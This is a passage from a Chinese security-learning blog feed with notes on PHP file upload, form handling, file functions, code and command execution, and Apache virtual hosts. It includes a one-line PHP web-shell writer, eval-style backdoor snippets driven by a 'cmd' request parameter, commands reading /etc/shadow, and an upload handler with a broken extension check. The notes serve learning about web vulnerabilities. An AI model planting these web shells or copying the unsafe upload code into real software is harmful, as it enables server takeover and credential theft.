class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="三、文件上传"><a href="#三、文件上传" class="headerlink" title="三、文件上传"></a>三、文件上传</h2><p>PHP可以把文件上传到服务器中。</p><p>文件上传的HTML表单，代码会在查看页面时出现上传界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;from&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/from&gt;</span><br></pre></td></tr></table></figure><p>在PHP中可以写上传文件的代码</p><p>在这里限制了只能上传jpg和png格式的文件如果上传的文件与规定上传的文件格式不匹配，是不允许上传的。</p><p>在上传后，文件将会存储在用户指定的文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ext_arr = array(&apos;jpg&apos;, &apos;png&apos;);</span><br><span class="line"> if (isset($_FILES[&apos;file&apos;]))&#123;</span><br><span class="line">     if ($_FILES[&apos;file&apos;] [&apos;error&apos;] == 0 )&#123;</span><br><span class="line">         if (in_array($filename, $ext_arr) === false) &#123;</span><br><span class="line">             echo &quot;上传文件扩展名是不允许的扩展名。&quot;;</span><br><span class="line">         &#125;else &#123;</span><br><span class="line"></span><br><span class="line">             $ok = move_uploaded_file($_FILES[&apos;file&apos;] [&apos;tmp_name&apos;], &apos;./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;name&apos;]);</span><br><span class="line">             if ($ok) &#123;</span><br><span class="line">                 echo &apos;文件保存在: ./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;tmp_name&apos;];</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 echo &apos;文件上传失败&apos;;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在文件夹中的存储方式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP文件包含、cookie、文件上传&quot;&gt;&lt;a href=&quot;#PHP文件包含、cookie、文件上传&quot; class=&quot;headerlink&quot; title=&quot;PHP文件包含、cookie、文件上传&quot;&gt;&lt;/a&gt;PHP文件包含、cookie、文件上传&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="php,文件包含,cookie,session,文件上传" scheme="https://clancyb00m.github.io/tags/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-cookie-session-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>php表单+文件+代码、命令执行</title>
    <link href="https://clancyb00m.github.io/2018/12/17/php%E8%A1%A8%E5%8D%95+%E6%96%87%E4%BB%B6+%E4%BB%A3%E7%A0%81%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://clancyb00m.github.io/2018/12/17/php表单+文件+代码、命令执行/</id>
    <published>2018-12-17T05:23:00.000Z</published>
    <updated>2018-12-30T10:47:34.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1><ul><li><p>三种接收表单数据的方式<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code></p><ul><li>特性：<ul><li>超全局变量</li><li>都是数组</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.$_GET</span><br><span class="line">此方式接收表单的method=&apos;get&apos;方式传递的值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.$_POST</span><br><span class="line">此方式接收表单的method=&apos;post&apos;方式传递的值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.$_REQUEST</span><br><span class="line">此方式接收表单get/post方式传递的值</span><br></pre></td></tr></table></figure></li><li><p>超全局变量$_SERVER：用于收集客户端请求信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_ADDR&apos;]返回当前运行脚本所在的服务器的IP地址</span><br><span class="line">$_SERVER[&apos;REMOTE_ADDR&apos;]返回浏览当前页面的用户的IP地址</span><br><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]服务器主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_HOST&apos;]用户的主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_PORT&apos;]用户连接到服务器的端口号</span><br><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]返回来自当前请求的Host头</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]来源IP地址（从哪个IP地址跳转过来的）</span><br></pre></td></tr></table></figure></li></ul><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul><li><p><code>fopen()</code>：打开文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(文件名,打开文件的方式);</span><br></pre></td></tr></table></figure><ul><li>打开文件常用的方式：<ul><li><code>r</code>：只读方式打开，指针位置在文件开头</li><li><code>r+</code>：读写方式打开，指针位置在文件开头</li><li><code>w</code>：写入方式打开，清空文件内容，如果文件不存在则创建</li><li><code>w+</code>：读写方式打开，清空文件内容，如果文件不存在则创建</li><li><code>a</code>：追加，打开并向文件末尾进行写操作，如果文件不存在则创建</li><li><code>a+</code>：可读并追加。通过向文件末尾写内容，来保持文件内容</li><li><code>x</code>：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li><li><code>x+</code>：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li></ul></li></ul></li><li><p><code>fgets()</code>：逐行读取文件，每次只读取一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(文件名);</span><br></pre></td></tr></table></figure></li><li><p><code>fread()</code>：按长度读取文件的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(文件名，长度);换行也算一个长度</span><br></pre></td></tr></table></figure></li><li><p><code>fwrite()</code>：写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(文件名，内容);</span><br></pre></td></tr></table></figure></li><li><p><code>fputs</code>：<code>fwrite()</code>的别名</p></li><li><p><code>fclose()</code>：关闭一个打开的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(文件名);</span><br></pre></td></tr></table></figure></li><li><p><code>feof()</code>：检测指针是否已到达文件末尾</p><ul><li>可以结合while循环来读取文件中所有的内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);</span><br><span class="line">while(!feof($file))//如果达到末尾，会返回TRUE</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure></li><li><p><code>unlink()</code>：删除文件</p></li><li><p><code>opendir()</code>：打开文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = opendir(目录);</span><br></pre></td></tr></table></figure></li><li><p><code>readdir()</code>：读取文件夹（从目录句柄中读取条目）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readdir($file);</span><br></pre></td></tr></table></figure></li><li><p><code>closedir()</code>：关闭文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">closedir($file);</span><br></pre></td></tr></table></figure></li><li><p><code>file_exists()</code>：检查文件或目录是否存在</p></li><li><p><code>copy()</code>：复制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(源文件名,复制后的文件名);可以移动的同时重命名文件</span><br></pre></td></tr></table></figure></li><li><p><code>rename()</code>：重命名文件或目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(源文件名,新文件名);</span><br></pre></td></tr></table></figure></li><li><p><code>file_get_contents()</code>：把整个文件读入一个字符串中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(文件[,include_path,context,start,max_length])</span><br></pre></td></tr></table></figure></li><li><p><code>file_put_contents</code>：把一个字符串写入文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename,$data)</span><br></pre></td></tr></table></figure></li></ul><p>用文件操作写一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul><li><p><code>eval()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数里可以使用单引号或者双引号</span><br><span class="line">使用单引号：变量不转义</span><br><span class="line">使用双引号：变量被转义</span><br></pre></td></tr></table></figure></li><li><p><code>assert()</code></p></li><li><p><code>preg_replace()</code>：正则里面使用<code>/e</code>模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);</span><br></pre></td></tr></table></figure></li><li><p><code>create_function()</code>：创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func();</span><br></pre></td></tr></table></figure></li><li><p><code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code>：动态创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要求：PHP版本5.2以下才可以使用</span><br><span class="line">在地址栏中使用：a=assert&amp;b=phpinfo()即可打印PHPinfo</span><br></pre></td></tr></table></figure></li></ul><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul><li><p>exec()：使用它必须在第二个参数指定一个变量来接收执行的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;cat /etc/shadow&quot;,$output);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure></li><li><p>system()：命令会直接执行，无需变量接收</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;phpinfo()&quot;);</span><br></pre></td></tr></table></figure></li><li><p>popen()：此函数是打开一个进程，可读取此进程的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);</span><br><span class="line">echo fread($file,5000);</span><br><span class="line">pclose($file);</span><br></pre></td></tr></table></figure></li><li><p>shell_exec()：此函数需要一个变量在外接收它的结果并输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&apos;ls -al&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;表单处理&quot;&gt;&lt;a href=&quot;#表单处理&quot; class=&quot;headerlink&quot; title=&quot;表单处理&quot;&gt;&lt;/a&gt;表单处理&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;三种接收表单数据的方式&lt;code&gt;$_GET&lt;/code&gt;、&lt;code&gt;$_POST&lt;/code&gt;、&lt;co
      
    
    </summary>
    
    
      <category term="php,表单处理,文件,代码执行,命令执行" scheme="https://clancyb00m.github.io/tags/php-%E8%A1%A8%E5%8D%95%E5%A4%84%E7%90%86-%E6%96%87%E4%BB%B6-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>apache配置和虚拟主机</title>
    <link href="https://clancyb00m.github.io/2018/12/14/apache%E9%85%8D%E7%BD%AE%E5%92%8C%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA/"/>
    <id>https://clancyb00m.github.io/2018/12/14/apache配置和虚拟主机/</id>
    <published>2018-12-14T04:21:00.000Z</published>
    <updated>2018-12-30T10:46:49.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache配置"><a href="#Apache配置" class="headerlink" title="Apache配置"></a>Apache配置</h1><ul><li><p>Apache主配置文件名：<code>httpd.conf</code></p><ul><li>每次修改完必须重启服务才能生效</li></ul></li><li><p>检查Apache主程序是否有语法错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在命令行中，输入：httpd.exe -t</span><br></pre></td></tr></table></figure><p>前提是配置好环境变量或者在主程序目录中执行</p></li><li><p>DocumentRoot：网站根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentRoot &quot;E:\WWW&quot;</span><br><span class="line">路径不能有中文，空格</span><br></pre></td></tr></table></figure></li><li><p>DirectoryIndex：网站默认首页文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex index.html index.php</span><br><span class="line">如果不指定的话，会显示目录列表，如果禁止显示，则什么都没有</span><br></pre></td></tr></table></figure></li><li><p>Listen：当Apache启动后，会等待请求的进入，监听本机指定IP地址和端口的访问，就像酒店的迎宾员，你去不去，他都在门口等着你。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法：Listen [IP][:端口号]</span><br><span class="line">如：</span><br><span class="line">Listen 80 监听本机的所有IP地址的80端口的请求</span><br><span class="line">Listen 192.168.3.100监听本机的指定IP地址的所有端口的访问</span><br><span class="line">Listen 192.168.3.100:80监听本机的指定IP地址的80端口的访问</span><br></pre></td></tr></table></figure></li><li><p><code>&lt;Directory&gt;&lt;/Directory&gt;</code>：设置网站根目录的客户端访问权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">1.指定网站根目录：DocumentRoot &quot;E:\WWW&quot;</span><br><span class="line">2.给网站根目录指定访问权限</span><br><span class="line">&lt;Directory &quot;E:\WWW&quot;&gt;</span><br><span class="line">Options 如果首页文件不存在，是否显示列表</span><br><span class="line">Order指定Deny(禁止)和Allow(允许)的执行顺序</span><br><span class="line">Deny禁止哪些外部IP访问你的主机</span><br><span class="line">Allow允许哪些外部IP访问你的主机</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">Options：指定服务器将启用哪些服务器特性。取值：None、All、Indexes</span><br><span class="line">None：禁止启用服务器特性(啥也看不见)</span><br><span class="line">All：开启所有服务器特性</span><br><span class="line">Indexes：如果首页文件不存在，则显示目录列表</span><br><span class="line">+Indexes：显示</span><br><span class="line">-Indexes：不显示</span><br><span class="line">Order：指定Allow和Deny的执行顺序</span><br><span class="line">Order Allow,Deny先允许访问，在禁止指定IP访问(黑名单)</span><br><span class="line">Order Deny,Allow先禁止所有访问，再指定IP访问(白名单)</span><br><span class="line">Deny：禁止哪些IP访问你的主机</span><br><span class="line">Deny from all禁止所有IP访问你的主机，包括自己</span><br><span class="line">Deny from 192.168.3.123禁止指定IP访问你的主机</span><br><span class="line">Deny from 192.168.3.123 192.168.3.133同时禁止两个外部IP访问你的主机</span><br><span class="line">Deny from 192.168.3禁止192.168.3.0到192.168.3.255之间所有IP访问</span><br><span class="line">Allow：允许哪些IP访问你的主机</span><br></pre></td></tr></table></figure><p>如果输入域名/IP后显示Forbidden，被禁止了，就先找默认首页文件，然后再找目录列表</p></li><li><p>ServerName：本地域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerName localhost</span><br></pre></td></tr></table></figure></li></ul><h1 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h1><ul><li><p>概念：将一台真实的主机划分成若干个”小空间”，对外”出租”，每一个”小空间”都具有网站的完整功能</p><ul><li>我们配置的虚拟主机，是基于域名的虚拟主机，即，一个IP地址，可以绑定多个域名</li></ul></li><li><p>NameVirtualHost：创建基于域名的虚拟主机的命令。换句话说：就是哪些IP地址可以访问定义的虚拟主机。该命令一般放在Apache的主配置文件中<code>httpd.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果要配置基于域名的虚拟主机，以下两项必须开启</span><br><span class="line">NameVirtualHost *:80</span><br><span class="line">Include conf/vhosts.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include用来包含一个文件，也就是说创建虚拟主机的工作就在vhosts.conf这个文件中完成</span><br></pre></td></tr></table></figure></li><li><p>配置步骤：</p><ol><li><p>配置本地的DNS文件——hosts</p><p>文件路径：C:\Windows\System32\drivers\etc\hosts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我来配置这个域名：</span><br><span class="line">127.0.0.1www.hai.com</span><br></pre></td></tr></table></figure></li><li><p>配置Apache的主配置文件——<code>httpd.conf</code></p><p>文件路径：..\conf\httpd.conf</p><p>监听自己的网卡的哪个IP地址的哪个端口的访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen 80</span><br></pre></td></tr></table></figure><p>以下指定哪些IP地址和端口可以访问虚拟主机，其中，IP地址必须是自己的网卡的IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NameVirtualHost *:80</span><br><span class="line">Include conf/vhosts.conf</span><br></pre></td></tr></table></figure></li><li><p>配置Apache的虚拟主机——<code>vhosts.conf</code></p><p>文件路径：..\conf\vhosts.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#配置www.hai.com</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">#给虚拟主机指定域名(注释只能单起一行)</span><br><span class="line">ServerName www.hai.com</span><br><span class="line">#指定默认首页，如果不指定，将继承全局配置；如果指定，将覆盖全局配置</span><br><span class="line">DirectoryIndex abc.html</span><br><span class="line">#指定网站根目录</span><br><span class="line">DocumentRoot &quot;E:\WWW\web1&quot;</span><br><span class="line">#配置目录权限</span><br><span class="line">&lt;Directory &quot;E:\WWW\web1&quot;&gt;</span><br><span class="line">Options +Indexes</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>为什么配置完虚拟主机，localhost不能用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">配置完虚拟主机后，第一个虚拟主机的优先级最高，比全局中的配置还要高。因此，访问localhost时，就指向了第一个虚拟主机</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">所以，要配置localhost的虚拟主机，并放在第一个</span><br><span class="line">#配置localhost</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName localhost</span><br><span class="line">DocumentRoot &quot;E:\WWW&quot;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache配置&quot;&gt;&lt;a href=&quot;#Apache配置&quot; class=&quot;headerlink&quot; title=&quot;Apache配置&quot;&gt;&lt;/a&gt;Apache配置&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Apache主配置文件名：&lt;code&gt;httpd.conf&lt;/code&gt;&lt;
      
    
    </summary>
    
    
      <category term="apache,配置,虚拟主机" scheme="https://clancyb00m.github.io/tags/apache-%E9%85%8D%E7%BD%AE-%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>php(以漏洞层面出发)</title>
    <link href="https://clancyb00m.github.io/2018/12/13/PHP%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93(%E4%BB%A5%E6%BC%8F%E6%B4%9E%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)/"/>
    <id>https://clancyb00m.github.io/2018/12/13/PHP基础总结(以漏洞层面出发)/</id>
    <published>2018-12-13T10:30:00.000Z</published>
    <updated>2018-12-30T10:47:24.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML-CSS"><a href="#HTML-CSS" class="headerlink" title="HTML + CSS"></a>HTML + CSS</h1><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;&apos;&gt;&lt;/a&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;from action=&apos;&apos; method=&apos;&apos;&gt;</span><br><span class="line">    &lt;input type=&apos;&apos; name=&apos;&apos; value=&apos;&apos;&gt;</span><br><span class="line">&lt;/from&gt;</span><br><span class="line"></span><br><span class="line">&lt;table border=&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;th&gt;Month&lt;/th&gt;</span><br><span class="line">    &lt;th&gt;Savings&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;td&gt;January&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;$100&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><ul><li>a img form三个标签必须掌握，了解href,src。针对于form标签，了解action,method,type,name,value.</li><li>特别是了解input中的name在PHP中的使用。</li></ul><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>熟练使用开发者工具</li><li>元素审查</li><li>控制台</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li>页面中加载js代码的方式（script标签直接写，使用事件调用，script使用src加载）</li><li>学会在js中定义变量</li><li>在js中使用数组</li><li>在js中调用函数</li><li>在整个html页面中，所有加载的代码，是一个整体。事件中、标签中、src文件中的代码是一个整体，可以在这三个位置使用其他位置的变量函数等。</li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ul><li>常用的事件</li><li>事件中可以直接执行代码</li><li>事件可以调用函数</li><li>利用错误的img或其他的标签，调用onerror事件，然后加载远程的js文件，控制浏览器（在之后的xss漏洞中会用到，可以先行了解）。</li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><ul><li>js使用dom获取一个标签元素</li><li>js使用dom修改一个标签元素</li><li>js使用dom添加一个标签元素（学会发送get/post请求）</li></ul><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><ul><li>location中几个url参数</li><li>document.cookie（自行了解）</li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="别忘了之前学的搭建lamp环境以及wamp环境"><a href="#别忘了之前学的搭建lamp环境以及wamp环境" class="headerlink" title="别忘了之前学的搭建lamp环境以及wamp环境"></a>别忘了之前学的搭建lamp环境以及wamp环境</h2><h2 id="PHP适合html结合在一起使用的。"><a href="#PHP适合html结合在一起使用的。" class="headerlink" title="PHP适合html结合在一起使用的。"></a>PHP适合html结合在一起使用的。</h2><ul><li>使用PHP动态的生成html页面</li><li>PHP标签的使用以及嵌入</li><li>PHP文件的后缀意义（很重要，在之后学习上传漏洞时会用到）<ul><li>apache默认只解析<code>.php</code>，<code>.phtml</code>文件后缀，可在Apache的配置文件<code>httpd.conf</code>中搜索<code>addtype</code>进行更改</li></ul></li></ul><h2 id="基础语法"><a 